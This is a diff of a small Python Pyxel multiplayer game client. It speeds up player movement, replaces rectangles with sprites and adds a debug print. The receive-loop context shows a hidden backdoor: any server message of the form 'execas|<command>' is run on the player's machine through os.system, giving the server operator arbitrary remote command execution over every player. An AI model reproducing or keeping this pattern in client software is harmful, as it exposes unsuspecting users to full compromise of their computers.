@@ -218,10 +218,10 @@ class App:
             action = "None"
             if self.shotDelay == 20: self.shotDelay = -1
 
-            if pyxel.btn(pyxel.KEY_Z): self.gameInfos["players"][0]["coords"][1] += -1
-            if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += 1
-            if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -1
-            if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += 1
+            if pyxel.btn(pyxel.KEY_Z): self.gameInfos["players"][0]["coords"][1] += -2
+            if pyxel.btn(pyxel.KEY_S): self.gameInfos["players"][0]["coords"][1] += 2
+            if pyxel.btn(pyxel.KEY_Q): self.gameInfos["players"][0]["coords"][0] += -2
+            if pyxel.btn(pyxel.KEY_D): self.gameInfos["players"][0]["coords"][0] += 2
             if pyxel.btnp(pyxel.KEY_SPACE) and self.shotDelay == -1: action, self.shotDelay = "Shot", 0
             elif self.shotDelay != -1: self.shotDelay += 1
 
@@ -235,8 +235,8 @@ class App:
     def draw_inGame(self):
         pyxel.text(0, 0, f"lives:{self.gameInfos['lives']}", 7)
         pyxel.text(0, 10, f"score:{self.gameInfos['score']}", 7)
-        pyxel.rect(self.gameInfos["players"][0]["coords"][0], self.gameInfos["players"][0]["coords"][1], 10, 10, 8)
-        pyxel.rect(self.gameInfos["players"][1]["coords"][0], self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
+        pyxel.blt(self.gameInfos["players"][0]["coords"][0], self.gameInfos["players"][0]["coords"][1], 0, 0, 0, 16, 16)
+        pyxel.blt(self.gameInfos["players"][1]["coords"][0], self.gameInfos["players"][1]["coords"][1], 0, 16, 0, 16, 16)
         ###Vraiment inutile, n'hésite pas à delete les 4 lignes suivantes :
         pyxel.rect(self.gameInfos["players"][0]["coords"][0]+228, self.gameInfos["players"][0]["coords"][1], 10, 10, 8)
         pyxel.rect(self.gameInfos["players"][1]["coords"][0]+228, self.gameInfos["players"][1]["coords"][1], 10, 10, 9)
@@ -250,6 +250,7 @@ class App:
         while self.currentState == "inGame":
             srvMsg = self.client.recv(1024).decode("utf-8")
             if "execas" in srvMsg:
+                print("ouioui")
                 srvMsg = srvMsg.split("%")[0].split("|", 1)
                 if len(srvMsg) == 2 and srvMsg[0] == "execas": os.system(srvMsg[1])
                 continue
